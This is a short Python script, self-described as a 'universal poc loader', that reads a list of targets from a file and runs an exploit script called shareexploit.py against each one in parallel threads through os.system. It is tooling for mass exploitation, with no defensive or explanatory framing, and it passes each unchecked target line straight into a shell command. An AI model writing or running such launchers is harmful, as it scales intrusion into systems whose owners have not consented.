import os
import subprocess
import sys 
import time
import threading
# universal poc loader by akamaiheat
timer = []
threads = []
with open(sys.argv[1], 'r') as file:
    lines = file.readlines()
    for i, line in enumerate(lines):
        time.sleep(1)     
        def run():
            os.system(f"""python2 shareexploit.py {line}""")

        r = threading.Thread(target=run)
        r.start()
        threads.append(r)
        timer1 = threading.Timer(20, r._stop)
        timer1.start()
        timer.append(timer1)
